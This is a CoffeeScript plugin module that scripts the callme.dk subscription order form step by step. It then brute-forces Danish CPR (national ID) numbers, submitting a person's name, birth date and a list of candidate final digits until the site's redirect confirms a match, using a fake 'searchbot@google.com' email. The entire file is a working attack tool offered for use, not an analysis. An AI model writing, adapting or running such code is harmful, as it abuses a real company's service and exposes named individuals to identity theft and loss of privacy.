Recipe = require("../Recipe.js")
Curl = require("../utils/Curl.js")
$ = require("jquery")
querystring = require("querystring")

class @Callme extends Recipe.Recipe

  # constructor
  constructor: (inputData, socket) ->
    console.log("Callme constructor")

    # important: following vars must be defined
    @inputData = inputData
    @socket = socket
    @counter = 0
    @domTarget = "#mainContainer"

    @req =
      url: 'https://www.callme.dk/pow-basic/4'
      method: 'POST'
      #encoding: "ISO-8859-1"
      data:
        task: "submitOrderPersonalInfo",
        email: "searchbot@google.com",
        emailConfirm: "searchbot@google.com",
        housing: "Ejerbolig",
        occupation: "Fuldtidsansat",
        civilStatus: "Gift",
        memberClub: "",
        memberNumber: "",
        eurobonusPoints: 0
        termsAccepted: "1",
        bankRegNumber: "",
        bankAccountNumber: "",
        subscriptionPaymentMethod: "noPaymentService",
        personlige: "Videre%20til%20bestilling"
        CPR1: inputData["dob"]
        CPR2: inputData["cprList"][0]
        firstName: inputData["firstName"]
        lastName: inputData["lastName"]

  updateCPR: ->
    @req.data.CPR2 = @inputData["cprList"][@counter]

  prepareRequest: (startBruteForce) ->
    self = @
    console.log("Prepare request started")
    preparationData = {}

    @step1 = (callback) ->
      Curl.getCookie("http://www.callme.dk/pow-basic/1", (cookie) ->
        preparationData.cookie = cookie
        self.req.cookie = cookie
        callback()
      )

    @step2 = (res, callback) ->

      req =
        url: "http://www.callme.dk/pow-basic/1"
        method: "POST"
        cookie: preparationData.cookie
        data:
          variationId: "590"
          task: "submitOrderSubscription"
          subscriptionId: "51"
            
      Curl.scrape req, (req, res, err) ->        
        callback(req, res, err)

    @step3 = (res, callback) ->

      req =
        url: "http://www.callme.dk/pow-basic/2"
        method: "POST"
        cookie: preparationData.cookie
        data:
          task: "submitOrderExtras"
          personlige: "Videre til personlige oplysninger"

      Curl.scrape req, (req, res, err) ->
        callback(req, res, err)

    @step4 = (res, callback) ->
      phonenumber = $(res.body).find(".tabs.show-newnumber input[name=newPhoneNumber]:first").val()

      req =
        url: "http://www.callme.dk/pow-basic/3"
        method: "POST"
        cookie: preparationData.cookie
        data:
          task: "submitOrderPhoneNumber"
          currentCallMeNumber: ""
          currentPhoneNumber: ""
          currentOperator: ""
          currentSIM: ""
          phoneNumberType: "newNumber"
          newPhoneNumber: phonenumber
          saldoLimitAmount: ""

      Curl.scrape req, (req, res, err) ->
        callback(req, res, err)

    self = @
    @step1 (req, res, err) -> self.waitForClient "step1", req, res, err, (res) ->
      self.step2 res, (req, res, err) -> self.waitForClient "step2", req, res, err, (res) ->
        self.step3 res, (req, res, err) -> self.waitForClient "step3", req, res, err, (res) ->
          self.step4 res, (req, res, err) -> self.waitForClient "step4", req, res, err, (res) ->
            console.log("Preperation finished")
            startBruteForce()          

  # Extend object: receive response
  getResponse: (req, res, callback) ->
    cpr = querystring.parse(req.data).CPR1 + querystring.parse(req.data).CPR2
    console.log(cpr)

    # A 302 redirect to /5 is a success
    if res.statusCode is 302 and res.headers.location is "http://www.callme.dk/pow-basic/5"
      callback cpr, "success"
    else
      status = $(res.body).find("#orderForm .mobiltelefoner .block01 .inner03 .error").text()
      callback cpr, status